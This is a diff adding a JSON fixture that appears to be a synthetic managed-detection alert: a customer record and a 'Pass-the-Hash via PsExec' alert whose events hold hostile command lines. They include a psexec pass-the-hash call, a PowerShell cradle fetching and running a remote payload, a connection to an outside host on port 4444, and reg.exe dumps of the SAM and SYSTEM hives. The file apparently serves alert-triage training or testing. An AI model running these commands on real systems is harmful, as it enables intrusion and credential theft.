@@ -1,0 +1,173 @@
+[
+    {
+  "Customer": {
+    "name": "Silverline Retail Corp",
+    "email": "CISO@silverline.no",
+    "phone_number": "+47 012 34 528",
+    "escalation_contact": "Silverline CISO",
+    "mdr_contract_type": "XDR",
+    "important_info": ""
+  }
+},
+  {
+    "type": "pth",
+    "alert_id": "ALRT-2025-10-24-WKSTN-23-SRV-APPS01",
+    "detected_time": "2025-10-24T10:16:28+02:00",
+    "alert_name": "Pass-the-Hash via PsExec",
+    "severity": "high",
+    "category": "Attempted Credential Dumping",
+    "source": "Multi-source Correlation Engine",
+    "metadata": {
+      "correlation_rule": "Pass-the-Hash via PsExec",
+      "confidence_score": null,
+      "num_linked_events": 7,
+      "first_event_time": "2025-10-24T10:15:03+02:00",
+      "last_event_time": "2025-10-24T10:16:28+02:00"
+    },
+    "entities": {
+      "host": "SRV-APPS01",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "parent_process": {
+        "name": "PSEXESVC.exe",
+        "pid": 748,
+        "grandparent": null,
+        "opened_file": null,
+        "command_line": "PSEXESVC.exe"
+      },
+      "child_process": {
+        "name": "powershell.exe",
+        "pid": 8020,
+        "parent": "PSEXESVC.exe",
+        "command_line": "TCP connection terminated: 10.0.12.37:49822 -> odd-lilac-weasel.zone:4444"
+      },
+      "edr": {
+        "rule": "Attempted credential dumping: SAM/SYSTEM hive access",
+        "action": "alert",
+        "final_status": "success",
+        "follow_up_action": null
+      },
+      "suspicious_hash": "8f7ce2f0d1f4e0a6a9a3a6c1c4ed2a6d98c3a21d6e0f4e1a9b2c3d4e5f6a7b8c"
+    },
+    "indicators": [
+      {
+        "type": "ProcessStart",
+        "timestamp": "2025-10-24T10:15:03+02:00",
+        "details": {
+          "host": "WKSTN-23",
+          "user": "ola.hansen",
+          "event_type": "process_start",
+          "process_name": "powershell.exe",
+          "process_id": 6160,
+          "parent_process": "explorer.exe",
+          "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass",
+          "file_hash_sha256": "8f7ce2f0d1f4e0a6a9a3a6c1c4ed2a6d98c3a21d6e0f4e1a9b2c3d4e5f6a7b8c",
+          "edr_action": "allow",
+          "status": "success"
+        }
+      },
+      {
+        "type": "ProcessStart",
+        "timestamp": "2025-10-24T10:16:12+02:00",
+        "details": {
+          "host": "WKSTN-23",
+          "user": "ola.hansen",
+          "event_type": "process_start",
+          "process_name": "psexec.exe",
+          "process_id": 6340,
+          "parent_process": "powershell.exe",
+          "file_path": "C:\\Users\\ola.hansen\\Downloads\\PsExec.exe",
+          "command_line": "psexec.exe \\\\SRV-APPS01 -u SILVERLINE\\svc_deploy -hashes 9f1c2a4d7e8b0c3f5a6d1e2b4c7a8f01 -s powershell.exe -c \"(New-Object System.Net.WebClient).DownloadString('http://192.168.45.199/payloads/run.txt') | IEX\"",
+          "url": "http://192.168.45.199/payloads/run.txt",
+          "edr_action": "alert",
+          "edr_rule": "Pass-the-Hash via PsExec",
+          "status": "success"
+        }
+      },
+      {
+        "type": "ServiceStart",
+        "timestamp": "2025-10-24T10:16:12+02:00",
+        "details": {
+          "host": "SRV-APPS01",
+          "user": "SILVERLINE\\svc_deploy",
+          "event_type": "service_start",
+          "process_name": "PSEXESVC.exe",
+          "process_id": 748,
+          "parent_process": "services.exe",
+          "file_path": "C:\\Windows\\PSEXESVC.exe",
+          "command_line": "PSEXESVC.exe",
+          "edr_action": "allow",
+          "status": "success"
+        }
+      },
+      {
+        "type": "ProcessStart",
+        "timestamp": "2025-10-24T10:16:14+02:00",
+        "details": {
+          "host": "SRV-APPS01",
+          "user": "NT AUTHORITY\\SYSTEM",
+          "event_type": "process_start",
+          "process_name": "powershell.exe",
+          "process_id": 8020,
+          "parent_process": "PSEXESVC.exe",
+          "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "powershell.exe -c \"(New-Object System.Net.WebClient).DownloadString('http://192.168.45.199/payloads/run.txt') | IEX\"",
+          "url": "http://192.168.45.199/payloads/run.txt",
+          "edr_action": "allow",
+          "status": "success"
+        }
+      },
+      {
+        "type": "NetworkConnection",
+        "timestamp": "2025-10-24T10:16:20+02:00",
+        "details": {
+          "host": "SRV-APPS01",
+          "user": "NT AUTHORITY\\SYSTEM",
+          "event_type": "network_connection",
+          "process_name": "powershell.exe",
+          "process_id": 8020,
+          "parent_process": "PSEXESVC.exe",
+          "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "TCP connection established: 10.0.12.37:49822 -> odd-lilac-weasel.zone:4444 (outbound)",
+          "edr_action": "alert",
+          "edr_rule": "Outbound TCP connection",
+          "status": "success"
+        }
+      },
+      {
+        "type": "ProcessStart",
+        "timestamp": "2025-10-24T10:16:28+02:00",
+        "details": {
+          "host": "SRV-APPS01",
+          "user": "NT AUTHORITY\\SYSTEM",
+          "event_type": "process_start",
+          "process_name": "cmd.exe",
+          "process_id": 8132,
+          "parent_process": "powershell.exe",
+          "file_path": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "cmd.exe /c reg.exe save HKLM\\\\SAM C:\\Windows\\Temp\\SAM.bak /y & reg.exe save HKLM\\\\SYSTEM C:\\Windows\\Temp\\SYSTEM.bak /y",
+          "edr_action": "alert",
+          "edr_rule": "Attempted credential dumping: SAM/SYSTEM hive access",
+          "status": "blocked"
+        }
+      },
+      {
+        "type": "NetworkTerminate",
+        "timestamp": "2025-10-24T10:16:28+02:00",
+        "details": {
+          "host": "SRV-APPS01",
+          "user": "NT AUTHORITY\\SYSTEM",
+          "event_type": "network_terminate",
+          "process_name": "powershell.exe",
+          "process_id": 8020,
+          "parent_process": "PSEXESVC.exe",
+          "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "TCP connection terminated: 10.0.12.37:49822 -> odd-lilac-weasel.zone:4444",
+          "edr_action": "kill",
+          "edr_rule": "EDR terminated process due to credential dumping",
+          "status": "terminated"
+        }
+      }
+    ]
+  }
+]
